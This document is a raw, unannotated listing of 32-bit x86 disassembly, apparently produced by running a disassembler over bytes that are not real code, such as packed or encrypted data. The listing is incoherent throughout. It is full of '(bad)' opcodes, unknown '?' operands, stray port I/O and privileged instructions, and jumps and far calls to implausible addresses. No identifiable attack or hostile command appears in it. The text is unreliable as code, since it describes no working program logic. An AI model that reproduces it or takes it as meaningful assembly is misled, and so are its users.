  4127f0:	lock dec edi
  4127f2:	clc    
  4127f3:	cmp    edi,0x3e074529
  4127f9:	adc    eax,0x72bf766b
  4127fe:	test   al,0x92
  412800:	in     al,dx
  412801:	xchg   ecx,eax
  412802:	jle    0x41287f
  412804:	ror    DWORD PTR [ebx+eax*2],cl
  412807:	add    al,0x1
  412809:	xchg   ecx,eax
  41280a:	pop    ds
  41280b:	mov    ?,WORD PTR [ecx+0x40]
  41280e:	cmp    bh,ah
  412810:	add    DWORD PTR [eax-0x1f],ecx
  412813:	push   ebp
  412814:	pop    ebp
  412815:	pop    esi
  412816:	or     al,0x2a
  412818:	xchg   edi,eax
  412819:	dec    ecx
  41281a:	shr    DWORD PTR [eax-0x50],cl
  41281d:	inc    esp
  41281e:	ret    
  41281f:	mov    eax,ds:0x4e1b91b0
  412824:	imul   edx,DWORD PTR [edi],0xfffffffa
  412827:	popf   
  412828:	mov    ds,WORD PTR [edx+0x55]
  41282b:	dec    esi
  41282c:	mov    ebx,0x2bbc5593
  412831:	sbb    ecx,DWORD PTR [ebp+0x66c5d7f]
  412837:	mov    eax,0xcf76f58b
  41283c:	scas   al,BYTE PTR es:[edi]
  41283d:	mov    cl,0xe7
  41283f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412840:	(bad)  
  412841:	fisttp DWORD PTR [eax+0x54]
  412844:	imul   esi,DWORD PTR [ebx],0xbb8663da
  41284a:	(bad)  
  41284b:	mov    bl,0xd
  41284d:	cwde   
  41284e:	jecxz  0x4128b0
  412850:	adc    al,0x5a
  412852:	mov    al,ds:0x70cf0ff9
  412857:	dec    ecx
  412858:	int    0xde
  41285a:	enter  0x3bb3,0xbf
  41285e:	fmul   DWORD PTR [edx-0x1a]
  412861:	jnp    0x412802
  412863:	cmp    ebx,DWORD PTR ds:0x9ee3180d
  412869:	cli    
  41286a:	add    BYTE PTR ds:0xbfd5b0bc,0x5d
  412871:	and    BYTE PTR [eax-0x361bd2d3],dh
  412877:	mov    ebx,0x9f86fb0b
  41287c:	push   ecx
  41287d:	push   edx
  41287e:	in     al,0x4f
  412880:	push   eax
  412881:	pop    ecx
  412882:	outs   dx,BYTE PTR ds:[esi]
  412883:	loope  0x412830
  412885:	out    dx,al
  412886:	push   eax
  412887:	loop   0x4128f6
  412889:	ret    
  41288a:	fidivr DWORD PTR [eax+eiz*8+0x40]
  41288e:	lahf   
  41288f:	pop    eax
  412890:	dec    ebp
  412891:	xchg   esp,eax
  412892:	xlat   BYTE PTR ds:[ebx]
  412893:	sbb    eax,DWORD PTR [ecx+ecx*8-0x2fbc5062]
  41289a:	(bad)  
  41289c:	ret    
  41289d:	neg    BYTE PTR [edx+0x726927b5]
  4128a3:	test   DWORD PTR [ebx-0x170f051f],esi
  4128a9:	outs   dx,DWORD PTR ds:[esi]
  4128aa:	out    dx,al
  4128ab:	jle    0x4128a6
  4128ad:	mov    bh,0xa3
  4128af:	jle    0x412875
  4128b1:	out    dx,al
  4128b2:	xchg   esp,eax
  4128b3:	cmc    
  4128b4:	jbe    0x41285f
  4128b6:	leave  
  4128b7:	add    cl,ah
  4128b9:	mov    ds:0xe77cff85,eax
  4128be:	dec    ebx
  4128bf:	sar    dl,1
  4128c1:	test   al,0xc7
  4128c3:	fisttp QWORD PTR [ebx+0x624e8069]
  4128c9:	mov    al,ds:0x61f12c79
  4128ce:	cmc    
  4128cf:	lds    ebx,FWORD PTR [ebx-0x264984d1]
  4128d5:	(bad)  
  4128d6:	out    dx,eax
  4128d7:	mov    ds:0x61e8268,eax
  4128dc:	sbb    ebp,DWORD PTR [ecx+ebx*2+0x42]
  4128e0:	leave  
  4128e1:	test   al,0x75
  4128e3:	adc    BYTE PTR [esp+eax*8-0x5a],cl
  4128e7:	and    dl,BYTE PTR [eax]
  4128e9:	mov    cl,0x51
  4128eb:	popf   
  4128ec:	sub    eax,0xbaa59268
  4128f1:	dec    ebp
  4128f2:	dec    edx
  4128f3:	push   0xffffffdf
  4128f5:	test   eax,ebp
  4128f7:	xchg   ecx,eax
  4128f8:	push   esp
  4128f9:	add    eax,0xe888e465
  4128fe:	or     ebx,0x9db8ea93
  412904:	sub    BYTE PTR [ebp+0x5dd0b55d],dh
  41290a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41290b:	sahf   
  41290c:	and    DWORD PTR [edi],eax
  41290e:	cmp    eax,0xa9e911
  412913:	inc    ebx
  412914:	jns    0x412960
  412916:	std    
  412917:	imul   ebp,DWORD PTR [esi-0x80],0x3d
  41291b:	fstp   TBYTE PTR ds:0xa482399e
  412921:	mov    edx,eax
  412923:	cs push ecx
  412925:	stos   DWORD PTR es:[edi],eax
  412926:	pop    ebp
  412927:	sbb    eax,0x55a37b12
  41292c:	das    
  41292d:	icebp  
  41292e:	cli    
  41292f:	mov    DWORD PTR [edi+0x3425043],esp
  412935:	push   ebp
  412936:	or     BYTE PTR ds:0x6d5afa5e,ah
  41293c:	mov    ebp,0x1bab928b
  412941:	jp     0x412999
  412943:	cmp    DWORD PTR [edx+0x7f0996e7],ebx
  412949:	gs jle 0x412908
  41294c:	mov    ecx,edi
  41294e:	mov    esi,0x593ffd3c
  412953:	push   0x17fde6e3
  412958:	push   eax
  412959:	and    al,0x32
  41295b:	or     DWORD PTR [ecx+0x12],esp
  41295e:	aam    0x2b
  412960:	and    edi,0x10
  412963:	loope  0x412940
  412965:	neg    DWORD PTR [eax+0x27d30a7]
  41296b:	sub    DWORD PTR [ecx-0x4307da8],eax
  412971:	mov    bh,cl
  412973:	jecxz  0x412914
  412975:	push   esp
  412976:	xchg   DWORD PTR [ecx-0x3b],edx
  412979:	inc    esp
  41297a:	mov    al,0xf8
  41297c:	popa   
  41297d:	ja     0x41296b
  41297f:	xor    ebp,DWORD PTR [ecx]
  412981:	push   edi
  412982:	and    cl,cl
  412984:	fsubr  st,st(0)
  412986:	push   ds
  412987:	and    al,0xe1
  412989:	inc    ebx
  41298a:	ror    DWORD PTR [ebp-0x33f9284e],1
  412990:	push   cs
  412991:	jp     0x4129df
  412993:	sub    eax,0x13cde2a
  412998:	jne    0x4129fd
  41299a:	js     0x412933
  41299c:	ret    
  41299d:	popa   
  41299e:	arpl   WORD PTR ds:0x22cfb478,si
  4129a4:	rol    ecx,0xe0
  4129a7:	popf   
  4129a8:	adc    esp,0x4d
  4129ab:	sub    ch,al
  4129ad:	bound  edi,QWORD PTR [ebp+0x43]
  4129b0:	cmc    
  4129b1:	das    
  4129b2:	in     al,0xef
  4129b4:	out    0x6a,al
  4129b6:	xor    DWORD PTR [ebx-0xb34fd6b],esp
  4129bc:	ds adc eax,0x60c0726e
  4129c2:	test   al,0xd4
  4129c4:	in     al,0x3d
  4129c6:	lock cld 
  4129c8:	push   edi
  4129c9:	jg     0x412970
  4129cb:	inc    edx
  4129cc:	pop    ss
  4129cd:	test   BYTE PTR [esi-0x5],al
  4129d0:	(bad)  
  4129d1:	jl     0x412a01
  4129d3:	pop    ebp
  4129d4:	call   0xc128da9f
  4129d9:	call   0x8521:0x8b0b4744
  4129e0:	cli    
  4129e1:	mov    ebx,0x2912dc58
  4129e6:	fsubp  st(3),st
  4129e8:	add    ecx,edi
  4129ea:	pop    esp
  4129eb:	ins    BYTE PTR es:[edi],dx
  4129ec:	test   al,0x3d
  4129ee:	and    DWORD PTR [ecx-0x5e],eax
  4129f1:	xlat   BYTE PTR ds:[ebx]
  4129f2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4129f3:	and    al,0x9a
  4129f5:	dec    ebx
  4129f6:	pop    ss
  4129f7:	add    ecx,ebp
  4129f9:	inc    edx
  4129fa:	leave  
  4129fb:	sbb    al,0xfa
  4129fd:	sti    
  4129fe:	das    
  4129ff:	adc    ecx,0x6e
  412a02:	mov    ebp,0xa80b9fa0
  412a07:	enter  0x4d3,0x55
  412a0b:	shl    BYTE PTR [ebp+0x16],0x85
  412a0f:	inc    esi
  412a10:	out    dx,al
  412a11:	jo     0x412a36
  412a13:	icebp  
  412a14:	out    dx,al
  412a15:	fs in  al,0x88
  412a18:	sbb    BYTE PTR [eax+0x58916592],cl
  412a1e:	sub    cl,BYTE PTR [eax]
  412a20:	in     eax,dx
  412a21:	aad    0x2
  412a23:	or     bl,BYTE PTR [esi+0x43ce0a90]
  412a29:	in     al,0x2a
  412a2b:	mov    bh,0xf8
  412a2d:	adc    edi,ebx
  412a2f:	push   ecx
  412a30:	inc    esi
  412a31:	cs int3 
  412a33:	push   esi
  412a34:	fwait
  412a35:	dec    ebp
  412a36:	(bad)  
  412a37:	mov    edx,0x2f24dd84
  412a3c:	sub    ecx,esp
  412a3e:	cld    
  412a3f:	xchg   edi,eax
  412a40:	in     eax,0x56
  412a42:	xor    eax,0x1a1a1b9c
  412a47:	mov    ch,0x2e
  412a49:	stc    
  412a4a:	pop    ecx
  412a4b:	mov    ds:0x9acbd1a2,eax
  412a50:	mov    ch,dh
  412a52:	add    BYTE PTR [ebx],dl
  412a54:	jmp    0xdbfc:0xea50e6bc
  412a5b:	js     0x412a32
  412a5d:	cmp    DWORD PTR [ebx-0x46],ebx
  412a60:	mov    ebx,0x90c1eed1
  412a65:	outs   dx,BYTE PTR ds:[esi]
  412a66:	in     eax,dx
  412a67:	ins    DWORD PTR es:[edi],dx
  412a68:	inc    edi
  412a69:	test   BYTE PTR [edi+ebx*2-0x52],dl
  412a6d:	in     eax,0x56
  412a6f:	out    dx,al
  412a70:	outs   dx,BYTE PTR ds:[esi]
  412a71:	int    0x9f
  412a73:	inc    ebx
  412a74:	inc    esi
  412a75:	icebp  
  412a76:	inc    edx
  412a77:	out    0x43,eax
  412a79:	adc    DWORD PTR [ecx+0x66],0xe1fdbee6
  412a80:	mov    ch,BYTE PTR [esi+0x43f3bd67]
  412a86:	and    BYTE PTR [edi+esi*4-0x2f],cl
  412a8a:	sbb    DWORD PTR [esi-0xe],eax
  412a8d:	jp     0x412aea
  412a8f:	in     eax,dx
  412a90:	(bad)
  412a93:	cwde   
  412a94:	leave  
  412a95:	pop    esi
  412a96:	cli    
  412a97:	aas    
  412a98:	adc    al,0xab
  412a9a:	fs sbb ebp,edi
  412a9d:	jg     0x412a49
  412a9f:	inc    DWORD PTR [eax+ecx*2+0x4cef7bf]
  412aa6:	push   ebx
  412aa7:	cdq    
  412aa8:	fsubr  QWORD PTR [edx+0x3e7adbcf]
  412aae:	adc    DWORD PTR [esi],ebp
  412ab0:	push   ecx
  412ab1:	dec    edx
  412ab2:	mov    al,0x1d
  412ab4:	outs   dx,DWORD PTR ds:[esi]
  412ab5:	add    al,0x1
  412ab7:	xor    eax,0x57001e59
  412abc:	repnz cli 
  412abe:	out    0xd2,al
  412ac0:	addr16 xchg ecx,eax
  412ac2:	call   0x7a8d530a
  412ac7:	retf   0xab0c
  412aca:	add    al,0x85
  412acc:	jmp    0x412b37
  412ace:	jmp    0xdd1d8216
  412ad3:	ret    
  412ad4:	mov    bl,0x22
  412ad6:	add    al,BYTE PTR [esi-0x34]
  412ad9:	push   eax
  412ada:	ror    bl,cl
  412adc:	out    0xab,al
  412ade:	push   0xd0a2b05f
  412ae3:	mov    edx,ebx
  412ae5:	mov    ecx,DWORD PTR [eax]
  412ae7:	in     eax,0xd7
  412ae9:	fwait
  412aea:	mov    edi,0xb38fafd6
  412aef:	imul   esp,DWORD PTR [edi+0x79],0x52
  412af3:	je     0x412ad4
  412af5:	mov    dh,0xe5
  412af7:	pop    ebx
  412af8:	jo     0x412ac9
  412afa:	pop    esi
  412afb:	sub    BYTE PTR [ecx-0x29900c83],bl
  412b01:	sbb    ch,BYTE PTR ds:0xc69799f4
  412b07:	sar    DWORD PTR [ebp-0x20],cl
  412b0a:	repz in al,dx
  412b0c:	(bad)  
  412b0d:	retf   0xa817
  412b10:	addr16 pop ebp
  412b12:	in     eax,dx
  412b13:	or     al,0xbf
  412b15:	push   0xa
  412b17:	repnz or al,0x6b
  412b1a:	push   0xb358f69f
  412b1f:	imul   esp,ecx,0xb59c8328
  412b25:	cmp    esp,esi
  412b27:	xor    bh,BYTE PTR [edx]
  412b29:	sbb    eax,DWORD PTR [ebx]
  412b2b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412b2c:	loopne 0x412ac7
  412b2e:	push   ebp
  412b2f:	xchg   ah,ch
  412b31:	stc    
  412b32:	dec    ebp
  412b33:	pop    es
  412b34:	lahf   
  412b35:	rcr    DWORD PTR [edi],cl
  412b37:	mov    BYTE PTR [edx+esi*4+0x50],al
  412b3b:	das    
  412b3c:	jmp    0x522ad15c
  412b41:	jo     0x412af0
  412b43:	inc    esi
  412b44:	cmp    eax,0xb721ea27
  412b49:	mov    eax,0x889e4c5a
  412b4e:	sahf   
  412b4f:	shl    bl,1
  412b51:	sub    BYTE PTR [edx],ah
  412b53:	mov    esi,0x60974839
  412b58:	mov    ds:0x159f45e7,al
  412b5d:	ss clc 
  412b5f:	shr    al,0xec
  412b62:	adc    esi,0x3
  412b65:	and    ecx,DWORD PTR [edi+0x4c]
  412b68:	pop    edx
  412b69:	clc    
  412b6a:	aam    0xb
  412b6c:	xchg   ebx,eax
  412b6d:	(bad)
  412b71:	jl     0x412b75
  412b73:	clc    
  412b74:	ret    
  412b75:	sub    al,BYTE PTR [eax+0x65df1b5e]
  412b7b:	mov    eax,0x5832a1bc
  412b80:	cmp    al,0x57
  412b82:	lahf   
  412b83:	xor    dh,cl
  412b85:	inc    esp
  412b86:	into   
  412b87:	js     0x412b33
  412b89:	outs   dx,BYTE PTR ds:[esi]
  412b8a:	aas    
  412b8b:	cmc    
  412b8c:	mov    ds:0x4024f517,al
  412b91:	jl     0x412bcb
  412b93:	scas   al,BYTE PTR es:[edi]
  412b94:	mov    ds:0xe4579302,eax
  412b99:	icebp  
  412b9a:	ds shr BYTE PTR es:[edi-0x31e87c36],0x34
  412ba3:	push   0xcc5e65a
  412ba8:	sti    
  412ba9:	adc    ebx,edx
  412bab:	adc    edx,eax
  412bad:	out    dx,al
  412bae:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412baf:	pop    ss
  412bb0:	jne    0x412b74
  412bb2:	aad    0x71
  412bb4:	fsubr  DWORD PTR [ebp+0x24]
  412bb7:	out    dx,eax
  412bb8:	adc    BYTE PTR [esi],ch
  412bba:	(bad)  
  412bbb:	int3   
  412bbc:	sbb    DWORD PTR ds:0x9c000740,0x2
  412bc3:	in     eax,0xd6
  412bc5:	or     dl,BYTE PTR [ebp-0x69a6644]
  412bcb:	push   ebx
  412bcc:	fdivr  DWORD PTR [esi]
  412bce:	add    edx,DWORD PTR [ebx-0x6]
  412bd1:	and    al,0xe9
  412bd3:	xchg   esi,eax
  412bd4:	and    DWORD PTR [esi],edx
  412bd6:	mov    edi,0x682bf00f
  412bdb:	mov    dh,0x5
  412bdd:	ret    
  412bde:	push   ecx
  412bdf:	ins    BYTE PTR es:[edi],dx
  412be0:	sub    eax,0x3587d12a
  412be5:	sahf   
  412be6:	adc    ebx,edi
  412be8:	or     BYTE PTR [ebp-0x427dc73c],0xe5
  412bef:	jecxz  0x412c3b
  412bf1:	call   0x85b3df9d
  412bf6:	sub    BYTE PTR [ecx],ah
  412bf8:	inc    edi
  412bf9:	mov    esi,0x5c00cfae
  412bfe:	enter  0xc692,0x6a
  412c02:	mov    eax,0xe7a3380f
  412c07:	mov    cl,0x73
  412c09:	and    eax,DWORD PTR [edx+eiz*4]
  412c0c:	sbb    ebp,DWORD PTR [ebx]
  412c0e:	or     al,0xd3
  412c10:	dec    edx
  412c11:	rcl    eax,cl
  412c13:	inc    esi
  412c14:	inc    edx
  412c15:	jmp    0xf4f4:0xc104fe23
  412c1c:	test   BYTE PTR [ecx+0x3dab9c96],cl
  412c22:	in     eax,dx
  412c23:	fsubp  st(3),st
  412c25:	jb     0x412c6b
  412c27:	sti    
  412c28:	shl    cl,0x85
  412c2b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412c2c:	dec    eax
  412c2d:	dec    eax
  412c2e:	lock cmp DWORD PTR [eax],ebx
  412c31:	sti    
  412c32:	daa    
  412c33:	js     0x412c72
  412c35:	aaa    
  412c36:	pop    edx
  412c37:	fcmovnbe st,st(3)
  412c39:	mov    ch,BYTE PTR [esi+edi*1-0x724aa2a3]
  412c40:	aad    0x6d
  412c42:	ret    
  412c43:	cwde   
  412c44:	std    
  412c45:	or     ebp,DWORD PTR [eax-0x7c91b789]
  412c4b:	out    0x6,eax
  412c4d:	imul   BYTE PTR [edi+0x1978c430]
  412c53:	push   ds
  412c54:	jne    0x412ca2
  412c56:	jno    0x412bf6
  412c58:	out    dx,eax
  412c59:	sub    edi,ebp
  412c5b:	out    dx,al
  412c5c:	fidivr WORD PTR [eax-0x383951bb]
  412c62:	xor    esi,0xf0a45b20
  412c68:	mov    ?,WORD PTR [esi-0x1a9678c2]
  412c6e:	mov    WORD PTR [eax+0x249acd2e],?
  412c74:	leave  
  412c75:	jg     0x412ca6
  412c77:	jp     0x412c64
  412c79:	sub    eax,0x97603990
  412c7e:	sub    al,0x83
  412c80:	clc    
  412c81:	ins    BYTE PTR es:[edi],dx
  412c82:	adc    eax,0xccd74cb5
  412c87:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412c88:	hlt    
  412c89:	int3   
  412c8a:	inc    ebx
  412c8b:	outs   dx,BYTE PTR ds:[esi]
  412c8c:	inc    BYTE PTR [esi]
  412c8e:	cmp    edx,DWORD PTR [edi+0x61]
  412c91:	pushf  
  412c92:	mov    ebx,0x2ceb26d7
  412c97:	sbb    DWORD PTR [ebx-0x4006eb39],edi
  412c9d:	jbe    0x412c5e
  412c9f:	jl     0x412d04
  412ca1:	sub    eax,0x64cca46f
  412ca6:	neg    DWORD PTR [ecx+ebp*2-0x26]
  412caa:	out    0x8f,al
  412cac:	adc    ecx,DWORD PTR [ecx-0x6b]
  412caf:	jp     0x412ce3
  412cb1:	aaa    
  412cb2:	mov    ebp,0x1f658e00
  412cb7:	xchg   edx,eax
  412cb8:	jae    0x412cd4
  412cba:	mov    DWORD PTR [eax-0x7c],eax
  412cbd:	ret    0x9dd1
  412cc0:	inc    ecx
  412cc1:	mov    ds:0xeb8cf77b,al
  412cc6:	xor    DWORD PTR [ecx+0x5f],ebx
  412cc9:	sbb    cl,BYTE PTR [edi+eax*1+0x19]
  412ccd:	adc    edx,DWORD PTR [eax]
  412ccf:	sub    DWORD PTR [ebx+esi*4+0x54c13174],edi
  412cd6:	xchg   BYTE PTR [ebx],al
  412cd8:	mov    ebp,0x6b468517
  412cdd:	or     eax,0xd908354f
  412ce2:	lea    esi,[eax]
  412ce4:	aad    0x14
  412ce6:	loop   0x412cdd
  412ce8:	icebp  
  412ce9:	(bad)  [esi+0x492920b4]
  412cef:	dec    ecx
  412cf0:	inc    esp
  412cf1:	aad    0xc8
  412cf3:	in     eax,dx
  412cf4:	mov    ebp,0xbe1d7c91
  412cf9:	pop    ecx
  412cfa:	out    0x70,al
  412cfc:	lea    esp,[ebx]
  412cfe:	xchg   edi,eax
  412cff:	and    DWORD PTR [ebx],esp
  412d01:	ds ret 
  412d03:	jp     0x412d2a
  412d05:	jne    0x412ce9
  412d07:	js     0x412d3b
  412d09:	sbb    ecx,DWORD PTR [esi+0xa214935]
  412d0f:	leave  
  412d10:	mov    ds:0x695ddfe,al
  412d15:	test   BYTE PTR [ebx+esi*2],dl
  412d18:	cs mov dl,dh
  412d1b:	push   ebx
  412d1c:	shl    DWORD PTR [ebx+0x4a43c355],0x79
  412d23:	sub    BYTE PTR [esi+0x0],ch
  412d26:	cdq    
  412d27:	mov    ds,WORD PTR [ecx-0x7d]
  412d2a:	out    dx,al
  412d2b:	dec    esp
  412d2c:	mov    WORD PTR [ebx+esi*4],gs
  412d2f:	xchg   DWORD PTR [edx],edx
  412d31:	jnp    0x412cbc
  412d33:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412d34:	mov    cl,0x5c
  412d36:	mov    ebp,0xf9b4ba66
  412d3b:	pop    es
  412d3c:	pop    esp
  412d3d:	xor    cl,BYTE PTR [ebp+ebx*8-0x7e5d15c0]
  412d44:	mov    ds:0xc106e041,eax
  412d49:	retf   
  412d4a:	mov    eax,0xb8999f54
  412d4f:	sahf   
  412d50:	add    DWORD PTR [edx-0x19],0x25
  412d54:	ret    0x4d71
  412d57:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412d58:	loope  0x412dd2
  412d5a:	push   cs
  412d5b:	inc    eax
  412d5c:	xor    BYTE PTR [ebp+0x6b8dfb2e],dl
  412d62:	int3   
  412d63:	sbb    al,0x93
  412d65:	mov    ch,0xf5
  412d67:	xchg   ebp,eax
  412d68:	inc    edx
  412d69:	test   BYTE PTR [esi+esi*4-0x18],al
  412d6d:	push   eax
  412d6e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412d6f:	pushf  
  412d70:	inc    edi
  412d71:	scas   al,BYTE PTR es:[edi]
  412d72:	mov    dl,ch
  412d74:	dec    esi
  412d75:	ins    DWORD PTR es:[edi],dx
  412d76:	mul    DWORD PTR [ebx-0x55]
  412d79:	fstp   QWORD PTR [ebx]
  412d7c:	mov    ds:0x6e3a4d10,eax
  412d81:	sbb    DWORD PTR [esp+edi*8+0x21],ebp
  412d85:	data16 (bad) 
  412d88:	sbb    esi,ecx
  412d8a:	jb     0x412dc8
  412d8c:	dec    esp
  412d8d:	push   edx
  412d8e:	shl    BYTE PTR [ebx+0x76],1
  412d91:	cdq    
  412d92:	ror    DWORD PTR [esi],1
  412d94:	fwait
  412d95:	jp     0x412d8a
  412d97:	imul   eax,DWORD PTR [esi-0x672b16e],0x23
  412d9e:	ss lahf 
  412da0:	jo     0x412dc1
  412da2:	adc    ebp,0x3a
  412da5:	dec    esp
  412da6:	adc    BYTE PTR [eax+edi*1],dl
  412da9:	mov    BYTE PTR [esi+0x3c253ec5],al
  412daf:	(bad)  
  412db0:	jmp    0x412d8f
  412db2:	xchg   ebp,eax
  412db3:	dec    edx
  412db4:	sbb    al,0xea
  412db6:	jnp    0x412d79
  412db8:	outs   dx,BYTE PTR ds:[esi]
  412db9:	xchg   BYTE PTR [ebx],ah
  412dbb:	sub    al,0xeb
  412dbd:	jne    0x412dd2
  412dbf:	(bad)  
  412dc0:	out    dx,eax
  412dc1:	inc    ecx
  412dc2:	(bad)
  412dc5:	and    dh,BYTE PTR [ebx+ebp*1-0x14724106]
  412dcc:	pusha  
  412dcd:	lods   eax,DWORD PTR ds:[esi]
  412dce:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412dcf:	aad    0xa3
  412dd1:	adc    eax,0xaffbe0bf
  412dd6:	mov    DWORD PTR [edx],0x4be92fdc
  412ddc:	push   esi
  412ddd:	jb     0x412e2e
  412ddf:	cmp    DWORD PTR [eax+0x556a0c8],edi
  412de5:	std    
  412de6:	adc    bl,BYTE PTR [ebx-0x5b]
  412de9:	mov    ch,0xa4
  412deb:	mov    ebp,0xffbe002
  412df0:	jbe    0x412db2
  412df2:	sbb    esp,ebx
  412df4:	xchg   DWORD PTR [esp+esi*2],esp
  412df7:	ror    ebp,cl
  412df9:	sbb    ebp,DWORD PTR [ebx-0x4e]
  412dfc:	sub    ebp,edx
  412dfe:	and    eax,0x8e2ab1ad
  412e03:	or     eax,DWORD PTR [eax-0x12a4878f]
  412e09:	retf   0xdf96
  412e0c:	mov    dl,0x60
  412e0e:	xor    dl,BYTE PTR [edx-0x2d]
  412e11:	mov    esi,0xf71dfbd5
  412e16:	cmp    cl,BYTE PTR [ebp-0x14]
  412e19:	repz sbb al,0xd
  412e1c:	dec    esp
  412e1d:	ret    
  412e1e:	fadd   DWORD PTR [eax-0x36]
  412e21:	sub    DWORD PTR [ecx+0x19],0x18
  412e25:	mov    bl,0x97
  412e27:	adc    BYTE PTR [edi+0x63c73ec1],ah
  412e2d:	loop   0x412dd1
  412e2f:	test   al,0xd6
  412e31:	sbb    eax,0x41ebd3d4
  412e36:	mov    cl,0x79
  412e38:	mov    ds:0xd42bfc69,eax
  412e3d:	ins    DWORD PTR es:[edi],dx
  412e3e:	icebp  
  412e3f:	push   ecx
  412e40:	scas   eax,DWORD PTR es:[edi]
  412e41:	in     eax,0x25
  412e43:	mov    ax,ds:0x26a54da6
  412e49:	mov    ds:0x4b01338a,eax
  412e4e:	mov    DWORD PTR [ecx],ebx
  412e50:	jmp    0x412e2e
  412e52:	das    
  412e53:	scas   eax,DWORD PTR es:[edi]
  412e54:	inc    esp
  412e55:	sbb    al,0xb3
  412e57:	inc    esp
  412e58:	pop    edi
  412e59:	xchg   esi,eax
  412e5a:	outs   dx,BYTE PTR ds:[esi]
  412e5b:	lods   al,BYTE PTR ds:[esi]
  412e5c:	xchg   ebp,eax
  412e5d:	aam    0x6c
  412e5f:	push   edi
  412e60:	mov    esi,0xd1ac9af1
  412e65:	dec    ebp
  412e66:	adc    al,0x6f
  412e68:	or     esi,DWORD PTR [ebp-0x7a4ccb0e]
  412e6e:	jo     0x412e50
  412e70:	push   0xfffffff7
  412e72:	pop    esi
  412e73:	bound  edx,QWORD PTR [eax]
  412e75:	lds    esp,FWORD PTR [esp+eiz*8+0x7f]
  412e79:	push   ebp
  412e7a:	add    dl,al
  412e7c:	push   ebx
  412e7d:	in     al,dx
  412e7e:	fcom   QWORD PTR [esi]
  412e80:	lock pop ebx
  412e82:	jmp    0x55ae95ef
  412e87:	or     ah,BYTE PTR [esi+ebp*2]
  412e8a:	pop    ebx
  412e8b:	ret    0x8226
  412e8e:	push   eax
  412e8f:	or     DWORD PTR [ebx+0x45572284],ebx
  412e95:	mov    bh,0x71
  412e97:	mov    bh,BYTE PTR [eax+0x7edfaa22]
  412e9d:	fistp  WORD PTR [ecx+0x32]
  412ea0:	ins    DWORD PTR es:[edi],dx
  412ea1:	add    ebx,ecx
  412ea3:	cld    
  412ea4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412ea5:	pop    ebp
  412ea6:	mov    ch,0x51
  412ea8:	sub    edx,ebp
  412eaa:	pop    es
  412eab:	sbb    BYTE PTR [ebx],bl
  412ead:	xchg   ebx,eax
  412eae:	cs jg  0x412f12
  412eb1:	fwait
  412eb2:	push   es
  412eb3:	cmc    
  412eb4:	inc    edi
  412eb5:	sub    DWORD PTR [bx+di-0x42],ebx
  412eb9:	push   0x9c08d171
  412ebe:	and    eax,0x44912150
  412ec3:	imul   edx
  412ec5:	jge    0x412f0f
  412ec7:	add    eax,0x763c6b74
  412ecc:	and    ecx,DWORD PTR [edi-0x33]
  412ecf:	lock rol BYTE PTR [esi],0xdd
  412ed3:	mov    edx,0x73048d4
  412ed8:	sub    al,0x28
  412eda:	pop    eax
  412edb:	pop    es
  412edc:	and    BYTE PTR [ecx+0x352b8b10],bh
  412ee2:	pushf  
  412ee3:	shl    BYTE PTR [ebp+0x121800d2],0xb0
  412eea:	cmp    DWORD PTR [edi+edi*4],ecx
  412eed:	xchg   BYTE PTR [eax+esi*1+0x5fc25dd1],ah
  412ef4:	mov    ch,0x9
  412ef6:	adc    DWORD PTR [ebx],ebp
  412ef8:	(bad)  
  412ef9:	cmp    al,0xa8
  412efb:	pop    ebx
  412efc:	push   ecx
  412efd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412efe:	ds call 0x4d3bfb5d
  412f04:	fs sub eax,0x5f3783fa
  412f0a:	fcmovnb st,st(3)
  412f0c:	push   edi
  412f0d:	push   eax
  412f0e:	int    0x31
  412f10:	dec    esp
  412f11:	jmp    0x412ea1
  412f13:	xchg   edx,eax
  412f14:	cmp    bl,al
  412f16:	mov    WORD PTR [edi+0x6a],gs
  412f19:	cmc    
  412f1a:	inc    edx
  412f1b:	xor    cl,BYTE PTR [eax]
  412f1d:	mov    ah,0xb5
  412f1f:	(bad)  
  412f20:	pop    esp
  412f21:	jmp    0x32f3b76e
  412f26:	cmp    esi,DWORD PTR [ebx+ebx*8]
  412f29:	pop    edx
  412f2a:	clc    
  412f2b:	sub    DWORD PTR [eax+0x49bd9129],esp
  412f31:	iret   
  412f32:	pop    ss
  412f33:	mov    ch,0x85
  412f35:	jecxz  0x412f95
  412f37:	mov    BYTE PTR [ecx-0x2c13b05],bh
  412f3d:	(bad)  
  412f3e:	ret    0x4b09
  412f41:	mov    bl,ah
  412f43:	fldcw  WORD PTR [edi+0x44]
  412f46:	fwait
  412f47:	(bad)  
  412f48:	jmp    0x1f23d5a7
  412f4d:	retf   0xf869
  412f50:	pop    edi
  412f51:	mov    eax,ds:0x9dc7f07d
  412f56:	in     al,0x31
  412f58:	sbb    DWORD PTR [esi+0x5b],ecx
  412f5b:	fwait
  412f5c:	nop
  412f5d:	add    al,0x27
  412f5f:	cdq    
  412f60:	leave  
  412f61:	pop    ebp
  412f62:	add    ebp,DWORD PTR [ebp-0x1f]
  412f65:	and    DWORD PTR [edi+0xe8a285],esp
  412f6b:	dec    ecx
  412f6c:	adc    ebp,DWORD PTR [edx+0x78cfbd0a]
  412f72:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412f73:	dec    ecx
  412f74:	gs stos BYTE PTR es:[edi],al
  412f76:	call   0x5826:0xe11bde7e
  412f7d:	es jnp 0x412fd2
  412f80:	pop    es
  412f81:	in     eax,dx
  412f82:	sub    al,BYTE PTR [eax]
  412f84:	scas   al,BYTE PTR es:[edi]
  412f85:	test   al,0x13
  412f87:	mov    WORD PTR ds:0x6f10325f,ds
  412f8d:	(bad)  
  412f8f:	xor    DWORD PTR [esi],ebx
  412f91:	sahf   
  412f92:	fcomip st,st(2)
  412f94:	pop    esi
  412f95:	std    
  412f96:	repnz (bad) 
  412f98:	into   
  412f99:	mov    eax,ds:0xcb52fa97
